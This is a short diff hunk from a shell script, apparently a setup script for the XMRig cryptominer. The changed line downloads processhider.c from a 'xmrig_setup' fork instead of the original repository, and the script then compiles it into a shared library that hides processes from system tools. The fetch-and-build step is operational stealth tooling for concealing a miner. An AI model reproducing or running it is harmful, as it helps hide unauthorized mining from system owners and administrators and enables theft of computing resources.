@@ -322,7 +322,7 @@ else
 fi
 echo ""
 
-wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c
+wget https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/processhider.c
 
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 
